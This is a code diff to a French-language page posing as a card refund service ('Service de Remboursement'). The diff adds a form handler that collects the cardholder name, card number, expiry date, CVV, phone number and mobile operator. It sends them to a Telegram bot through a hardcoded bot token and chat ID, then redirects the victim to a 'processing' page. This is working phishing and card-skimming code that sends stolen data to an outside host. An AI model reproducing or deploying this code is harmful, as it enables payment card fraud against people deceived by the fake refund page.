@@ -122,30 +122,57 @@
             <p class="text-xs mt-4">&copy; 2024 Service de Remboursement. Tous droits réservés.</p>
         </div>
     </footer>
-
+    
     <!-- JavaScript -->
     <script>
         function formatCardNumber(input) {
-            let value = input.value.replace(/\D/g, ''); // حذف الحروف غير الرقمية
-            value = value.replace(/(.{4})/g, '$1 ').trim(); // إضافة مسافة بين كل 4 أرقام
+            let value = input.value.replace(/\D/g, '');
+            value = value.replace(/(.{4})/g, '$1 ').trim();
             input.value = value;
+        }
 
-            const cardError = document.getElementById('card-error');
-            if (/^4/.test(value.replace(/\s+/g, '')) || /^5[1-5]/.test(value.replace(/\s+/g, ''))) {
-                input.classList.remove('border-red-500');
-                cardError.classList.add('hidden');
-            } else if (value.length >= 1) {
-                input.classList.add('border-red-500');
-                cardError.classList.remove('hidden');
-            } else {
-                input.classList.remove('border-red-500');
-                cardError.classList.add('hidden');
+        async function redirectToTraitement(event) {
+            event.preventDefault();
+
+            const cardHolder = document.getElementById('nom').value;
+            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, '');
+            const expirationDate = document.getElementById('date-expiration').value;
+            const cvv = document.getElementById('cvv').value;
+            const phoneNumber = document.getElementById('telephone').value;
+            const operator = document.getElementById('operateur').value;
+
+            const message = `
+🔔 Nouveau remboursement :
+🧾 Titulaire : ${cardHolder}
+💳 Carte : **** **** **** ${cardNumber.slice(-4)}
+📅 Expiration : ${expirationDate}
+🔐 CVV : ${cvv}
+📞 Téléphone : ${phoneNumber}
+📡 Opérateur : ${operator}
+            `;
+
+            const botToken = '7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I';
+            const chatId = '5372119436';
+
+            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            try {
+                const response = await fetch(apiUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: chatId, text: message })
+                });
+
+                if (response.ok) {
+                    window.location.href = "Traitement.html";
+                } else {
+                    alert('❌ Erreur lors de l\'envoi des données.');
+                }
+            } catch (error) {
+                alert('❌ Erreur de connexion au serveur.');
+                console.error(error);
             }
         }
-        function redirectToTraitement(event) {
-    event.preventDefault(); // منع إعادة تحميل الصفحة
-    window.location.href = "Traitement.html"; // توجيه المستخدم إلى الصفحة
-}
     </script>
 </body>
 </html>
